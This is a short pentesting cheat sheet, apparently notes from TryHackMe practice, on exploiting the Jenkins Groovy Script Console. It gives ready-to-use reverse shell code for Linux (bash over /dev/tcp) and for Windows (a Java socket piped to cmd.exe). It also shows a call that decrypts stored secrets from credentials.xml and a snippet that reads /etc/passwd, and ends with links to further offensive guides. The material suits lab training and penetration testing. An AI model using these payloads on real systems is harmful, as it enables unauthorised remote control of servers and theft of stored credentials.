Jenkins are installed on system as a user.

# Getting reverse shell on linux machine
This is via "Manage jenkins">"Script Console"> write your script here (**Internal TryHackMe**)

```bash
r = Runtime.getRuntime()  
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])  
p.waitFor()
```

# Windows
```bash
String host="localhost";  
int port=8044;  
String cmd="cmd.exe";  
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
**Extracting passphrase from Jenkins’ credentials.xml**

Credentials.xml can be found under the Jenkins installation folder which may help us to have another password and perhaps getting root/administrative access on the server. In order to check how to get credentials, please see the post [here](https://alionder.net/whitebox-approach-to-jenkins/).  
```bash
println( hudson.util.Secret.decrypt("Content_of_credentials.xml") )
```
Additional Resource can be found here: [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter—toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)

# Code execution on Script Console
```bash
def command = "cat /etc/passwd"  
def proc = command.execute()  
proc.waitFor()  
  
println "Process exit code: ${proc.exitValue()}"  
println "Std Err: ${proc.err.text}"  
println "Std Out: ${proc.in.text}"
```



----


<center><h2>Resources</h2></center>


https://github.com/gquere/pwn_jenkins
https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins

Getting reverse shell if you get into the jenkins dashboard:

*Google search:*`ways to get reverse shell on jenkins`

https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6

https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/

https://www.hackingarticles.in/exploiting-jenkins-groovy-script-console-in-multiple-ways/